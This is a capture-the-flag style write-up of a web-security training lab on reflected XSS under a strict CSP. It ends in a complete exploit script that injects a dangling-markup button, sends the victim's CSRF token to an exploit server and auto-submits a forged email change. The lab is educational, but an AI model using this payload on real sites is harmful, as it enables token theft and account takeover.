# Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

**End Goal:** Hijack a form to exfiltrate the victim's CSRF token and use it to change their email to `hacker@evil-user.net`.

**Login:** `wiener:peter`

**Analysis**

- Access lab --> log in as wiener --> go to My account
- There's a change-email form with a hidden `csrf` token, and the `email` param on `/my-account` is reflected into the input

*The CSP blocks inline script and external subresources, so I can't run JS or exfil via an image. But it doesn't set `form-action`, so I can inject a form/button that submits to my exploit server. This is a dangling-markup form hijack.*

- My injection payload (closes the input, adds a button labelled "Click me" whose `formaction` points to my exploit server, sent via GET so the csrf lands in the URL):

- Click **Go to exploit server** --> note the lab URL and exploit server URL
- Exploit server --> File: `/exploit` --> paste this into the Body (fill in both URLs) --> Store:

- Click **Deliver exploit to victim** --> lab solved

**Answer:**

<script>
  const LAB = "https://0a2c00210327cdb880d92629001f00c7.web-security-academy.net";
  const EXPLOIT = "https://exploit-0a38006503d7cd7b8097254001b1009d.exploit-server.net/exploit";

  const csrf = new URL(location).searchParams.get("csrf");

  if (csrf) {
    const form = document.createElement("form");
    form.method = "post";
    form.action = LAB + "/my-account/change-email";
    const email = document.createElement("input");
    email.name = "email";
    email.value = "hacker@evil-user.net";
    const token = document.createElement("input");
    token.name = "csrf";
    token.value = csrf;
    form.append(email, token);
    document.documentElement.append(form);
    form.submit();
  } else {
    const payload = 'blah@blah"><button class=button formaction=' + EXPLOIT +
                    ' formmethod=get type=submit>Click me</button>';
    location = LAB + "/my-account?email=" + encodeURIComponent(payload);
  }
</script>